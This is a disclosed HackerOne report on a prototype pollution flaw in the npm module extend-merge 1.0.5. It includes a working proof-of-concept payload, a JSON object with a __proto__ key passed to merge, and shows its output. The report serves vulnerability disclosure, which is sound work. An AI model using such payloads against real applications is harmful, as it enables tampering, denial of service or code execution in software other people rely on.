---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '878339'
original_report_id: '878339'
title: '[extend-merge] Prototype pollution'
weakness: Modification of Assumed-Immutable Data (MAID)
team_handle: nodejs-ecosystem
created_at: '2020-05-19T19:34:31.760Z'
disclosed_at: '2020-09-06T13:00:50.364Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- modification-of-assumed-immutable-data-maid
---

# [extend-merge] Prototype pollution

## Metadata

- HackerOne Report ID: 878339
- Weakness: Modification of Assumed-Immutable Data (MAID)
- Program: nodejs-ecosystem
- Disclosed At: 2020-09-06T13:00:50.364Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a `prototype pollution` vulnerability in `extend-merge` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `extend-merge`
**version:** `1.0.5`
**npm page:** `https://www.npmjs.com/package/extend-merge`

## Module Description

Shallow extend and deep merge utility function.

## Module Stats

[48] weekly downloads

# Vulnerability

## Vulnerability Description

The `merge` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `extend-merge` module:
    - `npm i extend-merge`

Create an object with `__proto__` property and pass it to the `merge` function:
```javascript

const extend_merge = require('extend-merge');
const payload =  JSON.parse('{"__proto__":{"polluted":"yes"}}');
let obj = {};
console.log("Before : " + obj.polluted);
extend_merge.merge({}, payload);
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F835068}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
